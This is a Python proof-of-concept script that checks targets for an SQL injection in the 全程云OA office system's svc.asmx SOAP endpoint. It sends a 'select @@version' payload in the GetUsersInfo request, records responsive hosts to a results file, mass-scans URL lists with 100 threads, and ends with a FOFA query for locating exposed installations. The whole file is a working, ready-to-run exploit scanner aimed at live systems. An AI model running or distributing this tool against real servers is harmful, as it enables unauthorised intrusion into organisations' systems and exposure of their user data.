import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """全程云OA-svc.asmx存在sql注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='全程云OA-svc.asmx存在sql注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/oa/pm/svc.asmx"
    headers = {
        "User-Agent":"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Maxthon/4.4.3.4000Chrome/30.0.1599.101Safari/537.36",
        "Content-Length":"369",
        "Content-Type":"text/xml;charset=utf-8",
        "Soapaction":"http://tempuri.org/GetUsersInfo",
        "Accept-Encoding":"gzip,deflate,br",
        "Connection":"close"
    }
    data = '<?xml version="1.0" encoding="utf-8"?>\n<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n<soap:Body>\n<GetUsersInfo xmlns="http://tempuri.org/">\n<userIdList>select @@version</userIdList>\n</GetUsersInfo>\n</soap:Body>\n</soap:Envelope>'
    try:
        response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and "System" in response.text:
            print(f"[+]{target}存在sql注入漏洞")
            with open('全程云_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在sql注入漏洞")
    except:
        print(f"[x]{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# "全程云OA" || "images/yipeoplehover.png"